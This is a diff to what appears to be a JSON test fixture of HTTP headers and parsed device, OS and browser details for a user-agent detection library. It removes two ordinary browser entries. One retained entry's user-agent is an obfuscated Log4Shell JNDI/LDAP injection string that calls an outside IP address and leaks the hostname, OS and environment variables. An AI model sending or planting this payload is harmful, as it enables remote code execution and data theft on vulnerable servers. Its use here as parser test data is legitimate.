@@ -691,66 +691,6 @@
   },
   {
     "headers": {
-      "device-memory": "4",
-      "dpr": "2.8125",
-      "viewport-width": "980",
-      "rtt": "100",
-      "downlink": "2.6",
-      "ect": "4g",
-      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\"",
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-arch": "\"x86\"",
-      "sec-ch-ua-platform": "\"Linux\"",
-      "sec-ch-ua-platform-version": "\"\"",
-      "sec-ch-ua-model": "\"\"",
-      "sec-ch-ua-bitness": "\"64\"",
-      "sec-ch-ua-full-version-list": "\" Not A;Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"101.0.4951.41\"",
-      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 (Ecosia android@101.0.4951.41)",
-      "sec-fetch-site": "same-origin",
-      "sec-fetch-mode": "navigate",
-      "sec-fetch-user": "?1",
-      "sec-fetch-dest": "document"
-    },
-    "device": {
-      "architecture": "x86",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": null,
-      "brand": null,
-      "dualOrientation": false,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": null,
-        "size": null
-      },
-      "type": null,
-      "ismobile": false,
-      "istv": false,
-      "bits": 64
-    },
-    "os": {
-      "name": "Linux",
-      "marketingName": "Linux",
-      "version": null,
-      "manufacturer": "linux-foundation"
-    },
-    "client": {
-      "name": "Ecosia",
-      "version": "101.0.4951.41",
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": "Blink",
-      "version": "101.0.4951.41",
-      "manufacturer": "google"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}://143.198.244.73:80/dn=gAAAAABjIdhlPpLMRM6s23OLg5IVGbN-g5f-kzYULlEOh2WKGQ2hKTVWMZHP6Wzr4TboAD8mj-ObpPjEWqG5EM4bj71yFWYU8map5oSc_qR4l8FjsXPMJUeKgCudSs31Hzqtvt4sOIQJ5w4FKL5IytCqaxhOc5KB4D10jw02PK34lH7RSINnv8arKra6cr1nXRe2Zq0B7p6js41OWATETA3EDSJP6_LeEkdHZk8-jzUkvMSr3a3NJH2yLXncwoQErUk0qwPyYFc4u2fEm6Lp_QmZHP7WEBomsj23Kk98t10kTSATcRDcjL7KFOtBiwEpbcOIB7tnBMkxwmxBQANqXMWZVZc__hVe-scC6umC9JJpKsrDaX4JPzv-ZAKQX8tFxXlpZpyeJpTJQ7sD6BKAk7HkHQJUnYffcscR3GwKZBv9E5_rJAkJRKayDzOf4YCC7DF2-V8_1pp6sdnh3xqmtf_KROTBSBrXkdrkcz6K2EpuSbHq6FWh_RaDqwFi9K9oPUt3kYwzATOBc0ogr-IJNnTkYtMXlJNc00X2cAUY0YPUjk1FRn49jyNTGcLhLsBhces7yCm0E8ZS_7XfXlhZgET-Dv_3ph6NE5yg--BO80vDr6tznHTl8WZxZHRQpKY9aYqFh_UVRIxgLkHcSxrvJ3-Rp5U4uEGVcW1rqQaqWccAHkhxAgqU3_xHRdiDRLGKwNce5QNi2poj_MeL_1Nj6pgEaIlAlL6gzYkvhx1OnW65aP7_AyS8y4pB70eWv74cz4KLQ8btbsmN3AR2JXBakGGHEnr9Gm0qBPYBlRW8loLV-yE6Qia_ZJwymXr0gE6eT5BOx1YLL9ZOIIOCJcKJhvBoBA-e44QTujtcvyt2KsaoOqtAIKP7SyJ_1b3F18yxSTfbu7Km2toeIeaDTTWQBQjJ7LWol1e8ouFvONUGO9bwdGsBZf2prfkPW3TwGgXx251PGilaXLjjPw9Ajunv96MCwOw7Tm_t21oyXU780uR_krqs7_4JQoOPnkpk7fBcYHnuB6k9u67k8QMzICqPockjtxa8QdkQaw==,cn='${hostName}',ou='${java:os}',ca1='${ENV:HOME:-Non}',ca2='${log4j:configParentLocation}',wca2='${ENV:HOMEPATH:-Non}'}"
     },
     "device": {
@@ -789,71 +729,6 @@
       "name": null,
       "version": null,
       "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "cp-extension-installed": "Yes",
-      "device-memory": "4",
-      "downlink": "6.1",
-      "dpr": "1.25",
-      "ect": "4g",
-      "rtt": "150",
-      "sec-ch-device-memory": "4",
-      "sec-ch-dpr": "1.25",
-      "sec-ch-prefers-color-scheme": "light",
-      "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"WaveBrowser\";v=\"103\", \"WaveBrowser\";v=\"103\"",
-      "sec-ch-ua-arch": "\"x86\"",
-      "sec-ch-ua-bitness": "\"64\"",
-      "sec-ch-ua-full-version": "\"1.2.8.1\"",
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-model": "\"\"",
-      "sec-ch-ua-platform": "\"Windows\"",
-      "sec-ch-ua-platform-version": "\"10.0.0\"",
-      "sec-ch-viewport-width": "1229",
-      "sec-fetch-dest": "document",
-      "sec-fetch-mode": "navigate",
-      "sec-fetch-site": "same-origin",
-      "sec-fetch-user": "?1",
-      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",
-      "viewport-width": "1229"
-    },
-    "device": {
-      "architecture": "x86",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": null,
-      "brand": null,
-      "dualOrientation": false,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": null,
-        "size": null
-      },
-      "type": null,
-      "ismobile": false,
-      "istv": false,
-      "bits": 64
-    },
-    "os": {
-      "name": "Windows",
-      "marketingName": "Windows",
-      "version": "10.0.0",
-      "manufacturer": "microsoft"
-    },
-    "client": {
-      "name": "Wave Browser",
-      "version": "103.0.0",
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": "Blink",
-      "version": "103.0.5060.53",
-      "manufacturer": "google"
     }
   },
   {
